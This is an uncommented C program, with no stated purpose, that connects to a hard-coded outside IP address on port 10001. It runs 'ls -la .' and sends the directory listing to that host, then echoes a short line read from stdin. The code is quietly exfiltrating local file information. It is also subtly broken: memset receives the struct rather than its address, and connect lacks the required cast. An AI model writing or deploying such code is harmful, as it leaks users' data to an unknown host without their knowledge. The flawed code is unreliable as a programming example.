#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 10001

int main() {
	int client = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;

	if (client == -1) {
		exit(EXIT_FAILURE);
	}

	memset(server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("40.78.16.217");
	server_addr.sin_port = htons(PORT);

	if (connect(client, &server_addr, sizeof(server_addr)) == -1) {
		exit(EXIT_FAILURE);
	}

	FILE *fp = popen("ls -la .", "r");
	char buf[0x1000];
	memset(buf, 0, 0x1000);

	if (fp == NULL) {
		exit(EXIT_FAILURE);
	}

	fread(buf, 1, 0x1000, fp);
	write(client, buf, 0x1000);

	pclose(fp);
	close(client);

	memset(buf, 0, 0x20);
	read(0, buf, 0x20);
	write(1, buf, strlen(buf));

	return 0;
}